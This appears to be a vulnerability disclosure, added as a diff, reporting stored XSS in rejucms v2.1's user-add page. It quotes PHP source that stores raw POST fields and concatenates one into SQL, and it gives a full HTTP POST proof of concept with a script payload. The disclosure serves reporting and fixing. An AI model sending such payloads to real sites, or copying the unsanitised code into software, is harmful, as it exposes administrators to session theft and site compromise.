@@ -1,0 +1,81 @@
+There is a storage xss vulnerability in rejucms_v2.1
+
+Description:
+There is a storage xss vulnerability in /WWW/rejucms_v2.1/ucenter/cms_user_add.php
+
+Vulnerability reasons:
+
+Part of the source code of the message board:
+
+1. Part of the code for the front of  processing of the website( /WWW/rejucms_v2.1/ucenter/cms_user_add.php )
+...
+<?php
+//1.本系统所有资源均自动采集，无需人工，省时省力。新版增加了发布视频功能、会员功能、充值功能、支付功能等。
+//2.影院自适应所有设备，PC/手机/pad均可使用。
+//3.本系统不依托任何第三方CMS，纯PHP，对环境要求小，基本所有的PHP环境都可轻松带起。
+//4.所有广告及版权信息均可从后台更改。
+//5.可对接微信（有教程及配置文件），可打包制作APP（苹果+安卓）。
+include('../system/inc.php');
+include('cms_check.php');
+
+if ( isset($_POST['save']) ) {
+null_back($_POST['u_name'],'请填写登录帐号');
+	null_back($_POST['u_password'],'请填写登录密码');
+$result = mysql_query('select * from rjcms_user where u_name = "'.$_POST['u_name'].'"');
+	if(mysql_fetch_array($result)){
+		alert_back('帐号重复，请输入新的帐号。');
+	}
+	$_data['u_name'] = $_POST['u_name'];
+	$_data['u_password'] = md5($_POST['u_password']);
+	$_data['u_email'] = $_POST['u_email'];
+	$_data['u_status'] = $_POST['u_status'];
+	$_data['u_group'] = $_POST['u_group'];
+	$_data['u_points'] = $_POST['u_points'];
+	$_data['u_fav'] =0;
+	$_data['u_plays'] =0;
+	$_data['u_downs'] =0;
+	$_data['u_status'] =1;
+	$_data['u_regtime'] =time();
+	$_data['u_start'] =time();
+	$_data['u_end'] =time();
+	$str = arrtoinsert($_data);
+	$sql = 'insert into rjcms_user ('.$str[0].') values ('.$str[1].')';   // Obviously there is a storage xss vulnerability here.
+	if (mysql_query($sql)) {
+		alert_href('添加成功!','cms_user.php');
+	} else {
+		alert_back('添加失败!');
+	}
+}
+?>
+  ...
+We can find that the script filtering is not strict. 
+
+Storaged xss vulnerability caused by variable s directly stored into the database.
+
+2.This vulnerability will be triggered when an administrator browses /WWW/rejucm_v2.1/admin/cms_book.php
+
+clicking:http://127.0.0.1/rejucms_v2.1/admin/cms_book.php
+
+
+Submitting a poc under /WWW/rejucms_v2.1/ucenter/cms_user_add.php, 
+the administrator browsing /WWW/rejucm_v2.1/admin/cms_book.php will trigger the xss vulnerability.
+POC:
+POST /ucenter/cms_user_add.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/ucenter/cms_user_add.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 143
+Cookie: Hm_lvt_1b228034eab3f86498adfd4e9d337209=1534252933,1534292794,1534681525; PHPSESSID=m9b98gvufgs7ard7gnvl90qka2; Hm_lpvt_1b228034eab3f86498adfd4e9d337209=1534681653
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+u_name=t%3Cscript%3Eaelrt%281%29%3C%2Fscript%3E&u_password=test&u_status=1&u_group=1&u_points=0&u_email=test%40test.com&save=%E4%BF%9D%E5%AD%98
+
+The poc is only used to prove that there is a storage xss vulnerability in rejucms.
+
+Repair method：
+Reference：htmlspecialchars(addslashes($variable))  
